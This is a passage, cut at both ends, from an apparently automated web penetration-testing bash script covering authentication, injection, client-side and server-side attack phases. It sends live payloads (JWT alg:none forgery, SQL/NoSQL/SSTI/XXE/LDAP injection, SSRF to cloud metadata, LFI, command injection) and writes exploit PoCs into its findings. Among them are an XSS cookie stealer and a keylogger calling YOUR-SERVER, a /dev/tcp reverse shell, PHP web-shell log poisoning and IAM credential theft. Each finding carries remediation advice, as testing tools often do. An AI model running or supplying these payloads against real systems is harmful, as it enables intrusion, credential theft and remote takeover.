      add_finding "User Enumeration via Response" "MEDIUM" "5.3" "curl" \
        "$AUTH_URL" "username" \
        "Different response for valid vs invalid username" \
        "curl -d 'username=admin&password=wrong' '$AUTH_URL'\ncurl -d 'username=zzznobody&password=wrong' '$AUTH_URL'\n# Compare responses" \
        "Return identical error messages for invalid username and invalid password." "auth"
    fi
  fi
done

# 6.4 JWT Vulnerability Testing
log "JWT vulnerability analysis..."
# Find JWT tokens in any response
for LURL in "$BASE_URL" "$BASE_URL/api" "$BASE_URL/api/user" "$BASE_URL/profile"; do
  RESP=$(_curl_head "$LURL" 2>/dev/null || true)
  JWT=$(echo "$RESP" | grep -oP 'eyJ[A-Za-z0-9+/=_\-]+\.[A-Za-z0-9+/=_\-]+\.[A-Za-z0-9+/=_\-]+' | head -1 || true)
  if [[ -n "$JWT" ]]; then
    ok "JWT token found at $LURL"
    # Test alg:none attack
    HEADER_B64=$(echo "$JWT" | cut -d'.' -f1)
    PAYLOAD_B64=$(echo "$JWT" | cut -d'.' -f2)
    # Build alg:none token
    NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
    NONE_TOKEN="${NONE_HEADER}.${PAYLOAD_B64}."
    NONE_RESP=$(_curl_code -H "Authorization: Bearer $NONE_TOKEN" "$LURL")
    if [[ "$NONE_RESP" == "200" ]]; then
      crit "JWT ALG:NONE VULNERABILITY on $LURL"
      add_finding "JWT Algorithm None Attack" "CRITICAL" "9.1" "custom" \
        "$LURL" "Authorization header" \
        "JWT accepted with alg:none — signature not verified!" \
        "# Decode JWT:\necho '$JWT' | cut -d'.' -f1 | base64 -d 2>/dev/null\necho '$JWT' | cut -d'.' -f2 | base64 -d 2>/dev/null\n\n# alg:none attack:\n# Set algorithm to none, remove signature\ncurl -H 'Authorization: Bearer $NONE_TOKEN' '$LURL'" \
        "Always validate JWT algorithm. Reject tokens with alg:none. Use library whitelist for allowed algorithms." "auth"
    fi

    # Test weak HMAC secret
    for WEAK_SECRET in "secret" "password" "123456" "admin" "key" "test" \
                       "${TARGET}" "jwt_secret" "your-256-bit-secret" "supersecret"; do
      # Verify signature using weak secret (Python check)
      VALID=$(python3 - << PYEOF 2>/dev/null
import hmac, hashlib, base64
try:
    parts = '$JWT'.split('.')
    if len(parts) != 3: exit()
    msg = (parts[0]+'.'+parts[1]).encode()
    sig = base64.urlsafe_b64decode(parts[2]+'==')
    test_sig = hmac.new('$WEAK_SECRET'.encode(), msg, hashlib.sha256).digest()
    if hmac.compare_digest(sig, test_sig): print('VALID')
except: pass
PYEOF
)
      if [[ "$VALID" == "VALID" ]]; then
        crit "JWT WEAK SECRET: '$WEAK_SECRET' on $LURL"
        add_finding "JWT Weak Signing Secret" "CRITICAL" "9.3" "custom" \
          "$LURL" "JWT signature" \
          "JWT HMAC secret is weak: '$WEAK_SECRET'" \
          "# Crack/forge JWT:\npip install jwt\npython3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '$WEAK_SECRET', algorithm='HS256'))\"" \
          "Use a cryptographically random 256-bit secret. Never use guessable secrets." "auth"
        break
      fi
    done
    break
  fi
done

# 6.5 OAuth / SSO Misconfiguration
log "OAuth and SSO security testing..."
# Check for OAuth endpoints
for OAUTH_PATH in /oauth/authorize /oauth/token /oauth/callback \
                  /api/oauth/token /connect/authorize \
                  /auth/callback /sso /saml/login; do
  CODE=$(_curl_code "$BASE_URL$OAUTH_PATH")
  if [[ "$CODE" =~ ^(200|301|302|400)$ ]]; then
    info "OAuth/SSO endpoint: $BASE_URL$OAUTH_PATH (HTTP $CODE)"
    echo "$BASE_URL$OAUTH_PATH" >> "$P06/oauth_endpoints.txt"
    # Check for open redirect in OAuth
    REDIR=$(_curl_code "$BASE_URL$OAUTH_PATH?redirect_uri=https://evil.test&response_type=code&client_id=test")
    if [[ "$REDIR" =~ ^(301|302)$ ]]; then
      LOCATION=$(_curl_head "$BASE_URL$OAUTH_PATH?redirect_uri=https://evil.test&response_type=code&client_id=test" \
        2>/dev/null | grep -i "^location:" | awk '{print $2}' | tr -d '\r' || true)
      if echo "$LOCATION" | grep -qi "evil.test"; then
        crit "OAUTH OPEN REDIRECT: $BASE_URL$OAUTH_PATH"
        add_finding "OAuth Open Redirect" "CRITICAL" "9.0" "curl" \
          "$BASE_URL$OAUTH_PATH" "redirect_uri" \
          "OAuth redirect_uri accepts arbitrary URLs — authorization code can be stolen" \
          "curl -v '$BASE_URL$OAUTH_PATH?redirect_uri=https://your-server.com&response_type=code&client_id=test'" \
          "Strictly whitelist OAuth redirect URIs. Use exact-match validation, never prefix matching." "auth"
      fi
    fi
  fi
done

ok "Phase 06 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 07 — INJECTION ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "07" "INJECTION ATTACKS" \
  "SQLi · NoSQLi · SSTI · XXE · LDAP · XPath · CRLF · Command Injection · Header Injection"

# 7.1 SQL Injection — sqlmap
if [[ "$SKIP_HEAVY" == "false" ]] && [[ -s "$P05/targets_all.txt" ]]; then
  log "SQL injection scanning with sqlmap..."
  sqlmap \
    -m "$P05/targets_all.txt" \
    --batch --random-agent --level=2 --risk=2 \
    --forms --crawl=2 \
    --technique=BEUSTQ \
    --output-dir="$P07/sqlmap/" \
    --results-file="$P07/sqlmap_results.csv" \
    --threads=5 \
    2>/dev/null || true

  if [[ -f "$P07/sqlmap_results.csv" ]] && grep -q "True" "$P07/sqlmap_results.csv" 2>/dev/null; then
    while IFS=',' read -r url param dbms os user vuln_type; do
      [[ "$param" == "Parameter" || -z "$param" ]] && continue
      if echo "$vuln_type" | grep -qi "true\|injectable"; then
        crit "SQL INJECTION: $url | Param: $param | DBMS: $dbms | User: $user"
        add_finding "SQL Injection" "CRITICAL" "9.8" "sqlmap" \
          "$url" "$param" \
          "CONFIRMED injectable. DBMS: $dbms | OS: $os | DB User: $user" \
          "# Dump databases:\nsqlmap -u '$url' -p '$param' --dbs --batch\n\n# Dump tables:\nsqlmap -u '$url' -p '$param' -D <db> --tables --batch\n\n# Dump data:\nsqlmap -u '$url' -p '$param' -D <db> -T users --dump --batch\n\n# OS shell:\nsqlmap -u '$url' --os-shell --batch" \
          "Use prepared statements/parameterized queries. Apply WAF. Principle of least privilege on DB user." "injection"
        notify_webhook "SQL INJECTION on $TARGET — $url param:$param DBMS:$dbms"
      fi
    done < "$P07/sqlmap_results.csv"
  fi
fi

# 7.2 NoSQL Injection
log "NoSQL injection testing..."
NOSQL_PAYLOADS=(
  '{"$gt":""}' '{"$ne":"null"}' '{"$regex":".*"}'
  '[$ne]=1' '[$gt]=0' '[$regex]=.*'
  "';return 'a'=='a' && ''=='" "' || '1'=='1"
)
for PURL in $(cat "$P05/targets_all.txt" 2>/dev/null | head -20); do
  for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
    CODE=$(_curl_code "$PURL" \
      --data-urlencode "username=$PAYLOAD" \
      --data-urlencode "password=$PAYLOAD" 2>/dev/null || echo "000")
    RESP=$(_curl_body "$PURL" \
      --data-urlencode "username=$PAYLOAD" 2>/dev/null | head -c 1000 || true)
    if [[ "$CODE" == "200" ]] && \
       echo "$RESP" | grep -qiE "welcome|dashboard|logged|token|success|profile"; then
      crit "NOSQL INJECTION: $PURL with payload: $PAYLOAD"
      add_finding "NoSQL Injection" "CRITICAL" "9.8" "custom" \
        "$PURL" "username/password" \
        "NoSQL operator injection bypasses authentication" \
        "curl -sk '$PURL' --data-urlencode 'username={\"\$ne\":\"null\"}' --data-urlencode 'password={\"\$ne\":\"null\"}'\n\n# JSON body attack:\ncurl -sk -X POST '$PURL' -H 'Content-Type: application/json' -d '{\"username\":{\"\\$gt\":\"\"},\"password\":{\"\\$gt\":\"\"}}'" \
        "Sanitize all inputs. Use parameterized queries for MongoDB. Disable $-operator injection." "injection"
      break
    fi
  done
done

# 7.3 SSTI — Server-Side Template Injection
log "Server-Side Template Injection testing..."
SSTI_PAYLOADS=(
  "{{7*7}}" "{{7*'7'}}" "{7*7}" "<%=7*7%>" "${7*7}"
  "#{7*7}" "${{7*7}}" "@(7*7)" "#set(\$x=7*7)\${x}"
  "{{config}}" "{{self}}" "${class}" "{{__class__}}"
)
SSTI_CONFIRM=("49" "7777777" "49" "49" "49" "49" "49" "49" "49")

for PURL in $(cat "$P05/targets_all.txt" 2>/dev/null | head -30); do
  PARAMS=$(echo "$PURL" | grep -oP '[?&][^=&]+=' | tr -d '?&=' | tr '\n' ' ')
  for PAYLOAD in "${SSTI_PAYLOADS[@]}"; do
    for PARAM in $PARAMS; do
      TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${PAYLOAD}|g")
      RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 2000 || true)
      if echo "$RESP" | grep -qP '49|7777777'; then
        crit "SSTI CONFIRMED: $PURL | Param: $PARAM | Payload: $PAYLOAD"
        add_finding "Server-Side Template Injection (SSTI)" "CRITICAL" "9.3" "custom" \
          "$PURL" "$PARAM" \
          "Template expression evaluated: $PAYLOAD → 49 confirmed" \
          "# Identify engine and escalate to RCE:\n# Jinja2 (Python):\ncurl '$PURL' --data '$PARAM={{config.items()}}'\ncurl '$PURL' --data '$PARAM={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}'\n\n# Twig (PHP):\ncurl '$PURL' --data '$PARAM={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'" \
          "Never pass user input to template engines. Sandbox template execution. Use safe templating modes." "injection"
        notify_webhook "SSTI on $TARGET — potential RCE!"
        break 2
      fi
    done
  done
done

# 7.4 CRLF Injection / HTTP Response Splitting
log "CRLF injection testing..."
CRLF_PAYLOADS=(
  "%0d%0aSet-Cookie:hackerofhell=1"
  "%0aSet-Cookie:hackerofhell=1"
  "%0d%0aLocation:https://evil.test"
  "%0D%0ASet-Cookie:hackerofhell=injected"
  "\r\nSet-Cookie:hackerofhell=1"
)
for PURL in $(cat "$P05/targets_all.txt" 2>/dev/null | head -20); do
  for PAYLOAD in "${CRLF_PAYLOADS[@]}"; do
    TESTURL="${PURL%%=*}=${PAYLOAD}"
    RESP_HEADERS=$(_curl_head "$TESTURL" 2>/dev/null || true)
    if echo "$RESP_HEADERS" | grep -qi "hackerofhell="; then
      vuln "CRLF INJECTION: $PURL"
      add_finding "CRLF Injection / HTTP Response Splitting" "HIGH" "7.5" "curl" \
        "$PURL" "URL parameter" \
        "CRLF characters in response headers — HTTP header injection confirmed" \
        "curl -v '$TESTURL'\n\n# XSS via CRLF:\ncurl -v '${PURL%%=*}=%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>'" \
        "URL-encode all user input before including in HTTP headers. Use security frameworks." "injection"
      break 2
    fi
  done
done

# 7.5 XXE — XML External Entity
log "XXE injection testing..."
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
XXE_PAYLOAD_SSRF='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
for LURL in $(cat "$P03/live_urls.txt" 2>/dev/null | head -20); do
  for CT in "application/xml" "text/xml"; do
    RESP=$(_curl_body -X POST \
      -H "Content-Type: $CT" \
      -d "$XXE_PAYLOAD" \
      "$LURL" 2>/dev/null | head -c 3000 || true)
    if echo "$RESP" | grep -qE "root:.*:0:0:|bin:/bin"; then
      crit "XXE CONFIRMED (file read): $LURL"
      add_finding "XML External Entity (XXE) — File Read" "CRITICAL" "9.1" "custom" \
        "$LURL" "XML body" \
        "XXE processes external entities — /etc/passwd readable" \
        "curl -sk -X POST '$LURL' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'\n\n# Escalate to SSRF:\ncurl -sk -X POST '$LURL' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>'" \
        "Disable external entity processing. Use safe XML parsers. Whitelist XML input schema." "injection"
    fi
  done
done

# 7.6 LDAP Injection
log "LDAP injection testing..."
LDAP_PAYLOADS=("*" "*)(uid=*))(|(uid=*" "admin)(&)(" "*()|%26'")
for PURL in $(cat "$P05/targets_all.txt" 2>/dev/null | head -20); do
  for PAYLOAD in "${LDAP_PAYLOADS[@]}"; do
    RESP=$(_curl_body "$PURL" \
      --data-urlencode "username=$PAYLOAD" 2>/dev/null | head -c 1000 || true)
    if echo "$RESP" | grep -qiE "welcome|logged|token|account"; then
      vuln "LDAP INJECTION: $PURL"
      add_finding "LDAP Injection" "HIGH" "7.5" "custom" \
        "$PURL" "username" "LDAP injection bypasses authentication" \
        "curl '$PURL' --data-urlencode 'username=*)(%26' --data-urlencode 'password=anything'" \
        "Escape all special characters in LDAP queries. Use parameterized LDAP libraries." "injection"
      break 2
    fi
  done
done

ok "Phase 07 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 08 — CLIENT-SIDE ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "08" "CLIENT-SIDE ATTACKS" \
  "XSS (Reflected/Stored/DOM) · CSRF · Clickjacking · Prototype Pollution · Open Redirect"

# 8.1 XSS with dalfox
log "XSS scanning with dalfox (multi-mode)..."
if has dalfox && [[ -s "$P05/targets_all.txt" ]]; then
  dalfox file "$P05/targets_all.txt" \
    --skip-bav --no-spinner --silence \
    --mining-dict --mining-dom \
    --waf-evasion \
    --format json \
    -o "$P08/xss_dalfox.json" 2>/dev/null || true

  python3 - << PYEOF 2>/dev/null
import json
try:
    with open('$FINDINGS') as f: d = json.load(f)
    with open('$P08/xss_dalfox.json') as f: results = json.load(f)
    items = results if isinstance(results, list) else []
    for r in items:
        url    = r.get('data',{}).get('url','') or r.get('url','')
        param  = r.get('data',{}).get('param','') or r.get('param','')
        payload= r.get('data',{}).get('payload','') or r.get('payload','')
        ptype  = r.get('type','Reflected XSS')
        if not (url and payload): continue
        d['findings'].append({
            'title': f'Cross-Site Scripting — {ptype}',
            'severity':'HIGH', 'cvss':'7.4', 'tool':'dalfox',
            'url':url, 'parameter':param, 'category':'xss',
            'evidence': f'Payload confirmed: {payload[:150]}',
            'poc': f'# Browser PoC:\n{url}?{param}={payload}\n\n# Cookie stealer:\n{url}?{param}=<script>document.location="https://YOUR-SERVER/?c="+document.cookie</script>\n\n# Keylogger:\n{url}?{param}=<script>document.addEventListener("keydown",function(e){{fetch("https://YOUR-SERVER/?k="+e.key)}})</script>',
            'remediation': 'HTML-encode all output. Use Content-Security-Policy. Avoid innerHTML.'
        })
        print(f'[XSS] {ptype} on {url} param:{param}')
    with open('$FINDINGS', 'w') as f: json.dump(d, f, indent=2)
except Exception as e: print(f'XSS parse: {e}')
PYEOF
fi

# 8.2 DOM XSS pattern detection
log "DOM-based XSS pattern analysis..."
DOM_SINKS=(
  "document.write(" "document.writeln(" "innerHTML" "outerHTML"
  "eval(" "setTimeout(" "setInterval(" "Function("
  "location.href" "location.replace(" "location.assign("
  "document.location" "window.location"
)
while IFS= read -r JSURL; do
  [[ -z "$JSURL" ]] && continue
  JSCONTENT=$(_curl_body "$JSURL" 2>/dev/null | head -c 100000 || true)
  FOUND_SINKS=""
  for SINK in "${DOM_SINKS[@]}"; do
    if echo "$JSCONTENT" | grep -qi "$SINK"; then
      FOUND_SINKS="$FOUND_SINKS $SINK"
    fi
  done
  # Check if URL params flow into sinks
  if echo "$JSCONTENT" | grep -qiP 'location\.(search|hash|href).*\b(innerHTML|eval|write)\b'; then
    vuln "DOM XSS SINK: $JSURL — user-controlled data flows to dangerous sink"
    add_finding "DOM-Based XSS Pattern" "HIGH" "7.1" "custom" \
      "$JSURL" "DOM sink" \
      "User-controlled URL parameters flow into dangerous DOM sinks: $FOUND_SINKS" \
      "# Manual DOM XSS testing:\n# Open DevTools Console:\n# Check what location.hash/search flows into\ncurl -sk '$JSURL' | grep -iE 'location.search|location.hash' | head -20" \
      "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. Sanitize before DOM operations." "xss"
  fi
done < "$P05/js_files.txt"

# 8.3 CSRF Detection
log "CSRF protection analysis..."
for LURL in "${AUTH_ENDPOINTS[@]:-}"; do
  [[ -z "$LURL" ]] && continue
  RESP_BODY=$(_curl_body "$LURL" 2>/dev/null | head -c 10000 || true)
  RESP_HEADERS=$(_curl_head "$LURL" 2>/dev/null || true)
  HAS_CSRF=false
  echo "$RESP_BODY" | grep -qiP 'csrf|_token|authenticity_token|nonce' && HAS_CSRF=true
  echo "$RESP_HEADERS" | grep -qiP 'SameSite=Strict|SameSite=Lax' && HAS_CSRF=true
  if [[ "$HAS_CSRF" == "false" ]]; then
    # Try submitting without CSRF token
    RESP=$(_curl_code -X POST "$LURL" \
      -d "username=admin&password=test&action=test" 2>/dev/null || echo "000")
    if [[ "$RESP" != "403" && "$RESP" != "000" ]]; then
      vuln "CSRF PROTECTION MISSING: $LURL"
      add_finding "Missing CSRF Protection" "HIGH" "7.5" "curl" \
        "$LURL" "POST form" \
        "No CSRF token found in form and POST request accepted without validation" \
        "# CSRF PoC HTML (save and open in victim browser while logged in):\n<html><body>\n<form action='$LURL' method='POST'>\n  <input name='amount' value='1000'>\n  <input name='to_account' value='attacker_account'>\n</form>\n<script>document.forms[0].submit()</script>\n</body></html>" \
        "Implement CSRF tokens on all state-changing operations. Use SameSite cookie attribute. Verify Origin/Referer headers." "csrf"
    fi
  fi
done

# 8.4 Clickjacking
log "Clickjacking protection check..."
RESP_HEADERS=$(_curl_head "$BASE_URL" 2>/dev/null || true)
if ! echo "$RESP_HEADERS" | grep -qiE "x-frame-options|frame-ancestors"; then
  # Try to iframe it
  vuln "CLICKJACKING: $BASE_URL — No X-Frame-Options or CSP frame-ancestors"
  add_finding "Clickjacking — Missing Frame Protection" "MEDIUM" "6.1" "curl" \
    "$BASE_URL" "X-Frame-Options / CSP" \
    "Site can be embedded in iframes — clickjacking attacks possible" \
    "# PoC HTML — save and open in browser:\n<html><body>\n<h1>Clickjacking PoC</h1>\n<iframe src='$BASE_URL' width='800' height='600'></iframe>\n</body></html>" \
    "Add: X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'" "web"
fi

# 8.5 Open Redirect — comprehensive
log "Open redirect testing (15+ parameters, 6 payloads)..."
REDIR_PARAMS=(redirect return url next goto dest target redir continue
              forward redirect_uri callback returnUrl redirectUrl
              returnTo successUrl failUrl landingUrl link out go
              to ref from source destination)
REDIR_PAYLOADS=(
  "https://evil-redirect-test.invalid"
  "//evil-redirect-test.invalid"
  "/\\evil-redirect-test.invalid"
  "https:evil-redirect-test.invalid"
  "%2F%2Fevil-redirect-test.invalid"
  "https%3A%2F%2Fevil-redirect-test.invalid"
  "javascript://evil-redirect-test.invalid/%0aalert(1)"
)
while IFS= read -r PURL; do
  for PARAM in "${REDIR_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${REDIR_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${PAYLOAD}|gi")
        LOCATION=$(_curl_head "$TESTURL" 2>/dev/null \
          | grep -i "^location:" | awk '{print $2}' | tr -d '\r' || true)
        if echo "$LOCATION" | grep -qi "evil-redirect-test.invalid"; then
          vuln "OPEN REDIRECT: $PURL → $LOCATION"
          add_finding "Open Redirect" "MEDIUM" "6.1" "curl" \
            "$PURL" "$PARAM" \
            "Redirects to external URL: $LOCATION via param $PARAM" \
            "curl -Lv '$TESTURL'\n\n# Phishing chain:\n$TESTURL\n\n# OAuth token steal via redirect:\n$BASE_URL/oauth/authorize?redirect_uri=${PAYLOAD}&response_type=token&client_id=test" \
            "Validate redirect URLs against strict whitelist. Use relative paths only." "redirect"
          break 2
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

# 8.6 Prototype Pollution
log "Prototype pollution testing..."
PP_PAYLOADS=(
  "__proto__[admin]=1"
  "constructor[prototype][admin]=1"
  "__proto__.admin=1"
)
for PURL in $(cat "$P05/targets_all.txt" 2>/dev/null | head -10); do
  for PP in "${PP_PAYLOADS[@]}"; do
    RESP=$(_curl_body "${PURL}&${PP}" 2>/dev/null | head -c 2000 || true)
    if echo "$RESP" | grep -qiE '"admin"\s*:\s*"1"|"admin"\s*:\s*true'; then
      vuln "PROTOTYPE POLLUTION: $PURL"
      add_finding "Prototype Pollution" "HIGH" "7.3" "custom" \
        "$PURL" "__proto__" \
        "Server-side prototype pollution confirmed — admin property injected" \
        "curl '$PURL&__proto__[admin]=1'\ncurl '$PURL&constructor[prototype][isAdmin]=true'" \
        "Sanitize and freeze Object prototype. Use Object.create(null) for user-data objects." "injection"
    fi
  done
done

ok "Phase 08 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 09 — SERVER-SIDE ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "09" "SERVER-SIDE ATTACKS" \
  "SSRF · LFI/RFI · RCE · Path Traversal · Deserialization · HTTP Smuggling"

# 9.1 SSRF — comprehensive cloud + internal
log "SSRF testing (6 cloud providers + internal)..."
SSRF_PARAMS=(url file path dest src redirect proxy load fetch image
             document import callback data content target endpoint
             host uri resource link webhook forward to from service)
SSRF_PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data"
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  "http://100.100.100.200/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  "http://127.0.0.1/"
  "http://localhost/"
  "http://[::1]/"
  "http://0.0.0.0/"
  "http://0177.0.0.1/"
  "http://2130706433/"
  "file:///etc/passwd"
  "file:///etc/shadow"
  "dict://127.0.0.1:6379/info"
  "gopher://127.0.0.1:6379/_info"
  "ftp://127.0.0.1/"
)
while IFS= read -r PURL; do
  for PARAM in "${SSRF_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${SSRF_PAYLOADS[@]}"; do
        ENC_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "$PAYLOAD")
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${ENC_PAYLOAD}|gi" | head -1)
        RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 2000 || true)
        # Check for cloud metadata indicators
        if echo "$RESP" | grep -qiE \
          "ami-id|instance-id|iam|security-credentials|computeMetadata|\
root:.*:0:0:|meta-data|169\.254|api-version=2021"; then
          crit "SSRF CONFIRMED: $PURL | Param: $PARAM → $PAYLOAD"
          add_finding "Server-Side Request Forgery (SSRF)" "CRITICAL" "9.3" "custom" \
            "$PURL" "$PARAM" \
            "SSRF confirmed — internal/cloud metadata accessible: $(echo $RESP | head -c 200)" \
            "# AWS metadata exfil:\ncurl '$TESTURL'\n\n# AWS IAM keys:\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/|gi")'\n\n# Internal port scan:\nfor port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do\n  curl -m 2 '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=http://127.0.0.1:\$port|gi")'\ndone" \
            "Whitelist allowed destinations. Block RFC1918 ranges. Use SSRF-safe HTTP clients. IMDSv2 for AWS." "ssrf"
          notify_webhook "SSRF on $TARGET — cloud metadata accessible!"
          break 3
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

# 9.2 LFI / Path Traversal
log "LFI and path traversal testing..."
LFI_PARAMS=(file page include path load template dir doc view read source)
LFI_PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "....//....//....//etc/passwd"
  "....\/....\/....\/etc\/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
  "/etc/passwd"
  "php://filter/convert.base64-encode/resource=/etc/passwd"
  "php://filter/read=convert.base64-encode/resource=index.php"
  "php://input"
  "expect://id"
  "file:///etc/passwd"
  "data://text/plain;base64,SSBoYXZlIExGSQ=="
  "/proc/self/environ"
  "/proc/self/cmdline"
  "C:\\Windows\\system32\\drivers\\etc\\hosts"
  "..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts"
)
LFI_FOUND=false
while IFS= read -r PURL; do
  for PARAM in "${LFI_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${LFI_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${PAYLOAD}|gi" | head -1)
        RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 3000 || true)
        if echo "$RESP" | grep -qE "root:.*:0:0:|bin:.*:/bin|daemon:|[Ww]indows|SYSTEM\|LOCAL SERVICE"; then
          crit "LFI CONFIRMED: $PURL | Param: $PARAM | Payload: $PAYLOAD"
          LFI_FOUND=true
          add_finding "Local File Inclusion (LFI)" "CRITICAL" "9.1" "custom" \
            "$PURL" "$PARAM" \
            "LFI confirmed — system files readable. Payload: $PAYLOAD" \
            "# Read system files:\ncurl '$TESTURL'\n\n# Read web config:\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=php://filter/convert.base64-encode/resource=../config.php|gi")' | base64 -d\n\n# Log poisoning for RCE:\ncurl -A '<?php system(\$_GET[\"cmd\"]);?>' $BASE_URL\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=../../../var/log/apache2/access.log\&cmd=id|gi")'" \
            "Validate file paths. Use basename(). Whitelist allowed files. Disable PHP wrappers." "lfi"
          notify_webhook "LFI on $TARGET — system files readable!"
          break 3
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

# 9.3 Remote Code Execution indicators
log "RCE pattern detection..."
RCE_PARAMS=(cmd command exec run shell eval code ping host ip)
RCE_PAYLOADS=(
  "ping+-c+1+127.0.0.1"
  ";id"
  "|id"
  "\`id\`"
  "$(id)"
  "&&id"
  ";sleep+5"
  "|sleep+5"
)
while IFS= read -r PURL; do
  for PARAM in "${RCE_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${RCE_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${PAYLOAD}|gi" | head -1)
        T_START=$(date +%s%3N)
        RESP=$(_curl_body "$TESTURL" 2>/dev/null | head -c 3000 || true)
        T_END=$(date +%s%3N)
        ELAPSED=$((T_END - T_START))
        if echo "$RESP" | grep -qP "uid=\d+\(|root|www-data|apache|nginx"; then
          crit "RCE CONFIRMED: $PURL | Param: $PARAM — Output: $(echo $RESP | grep -oP 'uid=\d+\([^)]+\)' | head -1)"
          add_finding "Remote Code Execution (RCE)" "CRITICAL" "10.0" "custom" \
            "$PURL" "$PARAM" \
            "Command injection confirmed — OS command output in response" \
            "# Execute commands:\ncurl '$TESTURL'\n\n# Reverse shell:\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'|gi")'" \
            "NEVER pass user input to shell commands. Use subprocess with argument arrays. Whitelist input strictly." "rce"
          notify_webhook "RCE CONFIRMED on $TARGET — CRITICAL"
        fi
        # Time-based blind RCE (sleep detection)
        if echo "$PAYLOAD" | grep -qi "sleep" && [[ "$ELAPSED" -gt 4500 ]]; then
          vuln "BLIND RCE (TIME-BASED): $PURL | Param: $PARAM | ${ELAPSED}ms delay"
          add_finding "Blind RCE via Command Injection (Time-Based)" "CRITICAL" "9.8" "custom" \
            "$PURL" "$PARAM" \
            "Time-based RCE: ${ELAPSED}ms delay confirms command execution" \
            "# Confirm with out-of-band:\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=|sleep+5|gi")'\n\n# Exfil data:\ncurl '$(echo $PURL | sed "s|${PARAM}=[^&]*|${PARAM}=\`whoami\`|gi")'" \
            "Sanitize all inputs. Avoid shell_exec, system(), exec(). Use safe API calls." "rce"
        fi
      done
    fi
  done
done < "$P05/targets_all.txt"

# 9.4 HTTP Request Smuggling detection
log "HTTP Request Smuggling / Desync detection..."
for LURL in $(cat "$P03/live_urls.txt" 2>/dev/null | head -5); do
  # CL.TE check
  RESP=$(timeout 10 curl -sk --http1.1 -X POST "$LURL" \
    -H "Content-Length: 6" \
    -H "Transfer-Encoding: chunked" \
    -d $'3\r\nABC\r\n0\r\n\r\n' 2>/dev/null | head -c 500 || true)
  if [[ -n "$RESP" ]] && ! echo "$RESP" | grep -qi "400\|Bad Request\|Invalid"; then
    vuln "HTTP SMUGGLING CANDIDATE: $LURL (CL.TE)"
    add_finding "HTTP Request Smuggling (CL.TE)" "HIGH" "8.1" "curl" \
      "$LURL" "HTTP headers" \
      "Server accepts conflicting Content-Length and Transfer-Encoding headers" \
